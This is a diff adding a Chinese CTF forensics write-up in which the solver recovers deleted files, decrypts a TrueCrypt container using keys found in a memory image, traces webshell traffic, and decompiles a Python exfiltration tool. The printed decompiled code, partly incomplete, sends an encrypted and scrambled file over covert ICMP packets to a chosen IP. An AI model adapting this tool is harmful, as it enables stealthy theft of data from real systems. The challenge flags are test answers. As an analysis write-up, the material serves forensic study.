@@ -2975,7 +2975,7 @@ def func1():
 
 但是提取出来后找个在线网站解码 `Short Ook!` 发现结果是空的
 
-这里考差了一个知识点就是 `Short Ook!` 和 `brainfuck` 一样，都是可以在内存中把结果删除的，并且二者是可以相互转换的
+这里考察了一个知识点就是 `Short Ook!` 和 `brainfuck` 一样，都是可以在内存中把结果删除的，并且二者是可以相互转换的
 
 因此这里我们可以找个在线网站先把 `Short Ook!` 转为 `brainfuck` ，然后用我博客里的脚本跑出内存中被删去的内容
 
@@ -3349,6 +3349,275 @@ if __name__ == "__main__":
     func2()
 ```
 
+## 题目名称 数据恢复溯源（2025数信杯）
+
+题面信息如下：
+
+> 背景：一家科技公司的运维⼈员在日常巡查的时候，发现⼀台服务器上出现了异常，这台服务器记录了许多重要的资料
+> 
+> 初步排查下来后发现是黑客入侵了服务器并通过技术手段窃取了重要的文件资料。
+> 
+> 现在公司找到你进行合作，请你根据系统自动保存下来的残存内容溯源整个攻击行为并找到泄露了那些文件资料。
+
+
+> 1. 数据恢复
+> 
+> 黑客在攻击时，为了对公司造成更大的破坏，直接删除了磁盘中的⽂件。
+> 
+> 但好在系统有自动的磁盘备份计划，保留了⼀个备份磁盘。
+> 
+> 请你通过技术手段，恢复出黑客删除的⽂件。
+> 
+> [答案标准]
+> 
+> 请找出删除的文件中的⼀个合同文件，提交合同编号。例：如果合同编号为flag{xx-xx-xx}，则最终提交答案为：xx-xx-xx
+
+
+> 2. 数据存储安全
+> 
+> 你通过技术手段恢复出黑客删除的文件后，发现存在加密文件，但是管理员忘记了密钥
+> 
+> 但经验丰富的你知道可以绕开验证直接读取加密文件中的内容。请你通过技术手段，读取加密内容。
+> 
+> [答案标准]
+> 
+> 请读取加密文件中的密码本，提交密码本中的内容。例：如果密码本中的内容为flag{xxxxxx}，则最终提交答案为：xxxxxx
+
+
+> 3. 流量分析
+> 你在破解开加密文件后，发现加密文件中存放着⼀个流量包，通过分析你发现流量包中记录着黑客攻击时产生的流量信息。你需要分析流量包，找出泄露的内容。
+> 
+> [答案标准]
+> 
+> 请读取泄露的内容，提交手机号为：18316978925的家庭住址信息
+> 
+> 例：手机号18316978925的家庭住址为：四川省成都市锦江区学府路159号和谐苑23栋5单元22室
+> 
+> 则最终提交答案为：四川省成都市锦江区学府路159号和谐苑23栋5单元22室
+
+附件给了一个disk.img，我们可以拿Diskgenius挂载并尝试恢复文件
+
+![](imgs/image-20260113105608075.png)
+
+恢复后可以得到一个PDF文件，打开后内容如下：
+
+![](imgs/image-20260113105644854.png)
+
+因此第一题的答案为：`HT-2025-001234`
+
+然后我们继续看恢复的文件，发现还有一个zip
+
+![](imgs/image-20260113105837947.png)
+
+解压后可以得到一个 WIN-SERVER-PC-20251202-122722.raw 
+
+然后我们直接拿010搜索`flag{`即可得到第二题的答案：`33c3789a36bb61beb6d4268cd7d13038`
+
+![](imgs/image-20260113105952417.png)
+
+然后这里用DiskGenius恢复出来的zip其实有点问题，解压的时候可能会报错，但是问题不大
+
+不过这里推荐的还是用R-Studio来扫码disk.iso，因为DiskGenius会扫不出来这个data文件(其实是个TrueCrypt的加密容器)
+
+![](imgs/image-20260113111402527.png)
+
+那个raw是个内存镜像文件，然后现在我们手上有了内存镜像和加密容器，就可以用PasswareKit从内存中扫描密钥对加密容器进行解密
+
+![](imgs/image-20260113111514081.png)
+
+解密完后，我们用R-Studio打开解密后的容器并扫描即可
+
+![](imgs/image-20260113150718771.png)
+
+`congratulations!.txt`和`密码本.txt`中是我们之前第二题的答案，两个文件中的内容是一样的
+
+`challenge.zip`解压后可以得到一个`challenge.pcap`，翻看一下流量包，定位到木马文件为：`/images/article/a.php`
+
+
+![](imgs/image-20260113152632797.png)
+
+看了一下响应中数据的特征，应该是菜刀的流量了
+
+![](imgs/image-20260113152800957.png)
+
+这里因为响应的内容直接是明文的，所以我们可以过滤并导出访问`/images/article/a.php`的所有流量
+
+然后直接追踪流一个个查看，但是看完后发现也没有找到泄露的地址，因此猜测不在这里
+
+继续回头去看最原始的流量包，发现最后一个http流get了一个exe文件
+
+![](imgs/image-20260113160423233.png)
+
+直接用wireshark导出，导出后发现是一个Python打包的exe
+
+![](imgs/image-20260113160507896.png)
+
+因此我们直接用`pyinstxtractor`解包
+
+![](imgs/image-20260113160807014.png)
+
+然后反编译一下pyc文件，这里用在线网站或者uncompyle6都行
+
+```python
+import os
+import sys
+import hashlib
+import hmac
+import struct
+import time
+import random
+from math import sqrt
+from Crypto.Cipher import AES, ChaCha20_Poly1305
+from Crypto.Protocol.KDF import PBKDF2
+from Crypto.Random import get_random_bytes
+from scapy.all import IP, ICMP, send
+
+class ObfuscatedCrypto:
+    def __init__(self, master_seed = (None,)):
+Unsupported opcode: POP_JUMP_IF_NOT_NONE (238)
+        pass
+    # WARNING: Decompyle incomplete
+
+    
+    def _init_keys(self):
+        base_material = self.master_seed + self._k1
+        self.key_layer1 = PBKDF2(base_material, self._k2 + b'\x01', dkLen = 32, count = 10000)
+        self.key_layer2 = PBKDF2(base_material + self.key_layer1, self._k2 + b'\x02', dkLen = 32, count = 10000)
+
+    
+    def encrypt_data(self, plaintext):
+        length_header = len(plaintext).to_bytes(4, 'big')
+        data_with_header = length_header + plaintext
+        cipher1 = ChaCha20_Poly1305.new(key = self.key_layer1)
+        nonce1 = cipher1.nonce
+        (ct1, tag1) = cipher1.encrypt_and_digest(data_with_header)
+        layer1_result = nonce1 + tag1 + ct1
+        cipher2 = AES.new(self.key_layer2, AES.MODE_GCM)
+        nonce2 = cipher2.nonce
+        (ct2, tag2) = cipher2.encrypt_and_digest(layer1_result)
+        layer2_result = nonce2 + tag2 + ct2
+        return layer2_result
+
+    
+    def get_master_seed(self):
+        return self.master_seed
+
+
+
+class EnhancedScrambler:
+    def __init__(self, scramble_seed):
+        self.seed = scramble_seed
+        self.rng = random.Random(self.seed)
+        self.shuffle_table = self._generate_shuffle_table()
+
+    
+    def _generate_shuffle_table(self):
+        table = list(range(256))
+        self.rng.shuffle(table)
+        return table
+
+    
+    def _apply_transform(self, index, total_count):
+        step1 = (index * 17 + 23) % total_count
+        step2 = (step1 ^ total_count - index) % total_count
+        step3 = (step2 + self.shuffle_table[index % 256]) % total_count
+        return step3
+
+    
+    def scramble_chunks(self, chunks):
+        total = len(chunks)
+        scrambled = []
+        for new_idx in range(total):
+            original_idx = self._apply_transform(new_idx, total)
+            scrambled.append((new_idx, original_idx, chunks[original_idx]))
+        return scrambled
+
+    
+    def get_seed(self):
+        return self.seed
+
+
+
+class StealthICMP:
+    def __init__(self, target_ip):
+        self.target = target_ip
+
+    
+    def build_packet(self, payload, metadata):
+        (chunk_idx, total_chunks, extra) = metadata
+        icmp_id = self._calc_id(chunk_idx, total_chunks)
+        icmp_seq = self._calc_seq(chunk_idx, total_chunks)
+        prefix = self._get_ping_prefix()
+        packet_data = prefix + payload
+        ip = IP(dst = self.target)
+        icmp = ICMP(type = 8, code = 0, id = icmp_id, seq = icmp_seq)
+        pkt = ip / icmp / packet_data
+        return pkt
+
+    
+    def _calc_id(self, idx, total):
+        val = idx * 0x9E3779B9 + 305419896 & 0xFFFFFFFF
+        return val >> 16 & 65535
+
+    
+    def _calc_seq(self, idx, total):
+        val = idx * 0x9E3779B9 + 305419896 & 0xFFFFFFFF
+        return val & 65535
+
+    
+    def _get_ping_prefix(self):
+        prefixes = [
+            b'abcdefghijklmnop',
+            b'qrstuvwabcdefghi',
+            bytes(range(16))]
+        return random.choice(prefixes)
+
+
+
+class BalancedExfiltrator:
+    def __init__(self, target_ip, chunk_size = (224,)):
+        self.target_ip = target_ip
+        self.chunk_size = chunk_size
+        self.crypto_seed = get_random_bytes(16)
+        self.crypto = ObfuscatedCrypto(self.crypto_seed)
+        timestamp = int(time.time())
+        self.scramble_seed = timestamp & 16777215 ^ 4342338
+        self.scrambler = EnhancedScrambler(self.scramble_seed)
+        self.icmp_builder = StealthICMP(target_ip)
+
+    
+    def exfiltrate(self, filepath):
+Unsupported opcode: BEFORE_WITH (108)
+        print(f'''[*] Target: {self.target_ip}''')
+        print(f'''[*] File: {filepath}''')
+    # WARNING: Decompyle incomplete
+
+
+
+def main():
+    if len(sys.argv) < 3:
+        print('Usage: exfiltrator_balanced.exe <target_ip> <file>')
+        sys.exit(1)
+    target = sys.argv[1]
+    filepath = sys.argv[2]
+    if not os.path.exists(filepath):
+        print(f'''Error: File not found: {filepath}''')
+        sys.exit(1)
+    exfil = BalancedExfiltrator(target)
+    exfil.exfiltrate(filepath)
+
+if __name__ == '__main__':
+    main()
+    return None
+return None
+# WARNING: Decompyle incomplete
+```
+
+翻看一下代码，代码大致的意思就是用icmp协议传输数据，并且传输过程中的数据是加密并且混淆过的
+
+```python
+
+```
 
 
 
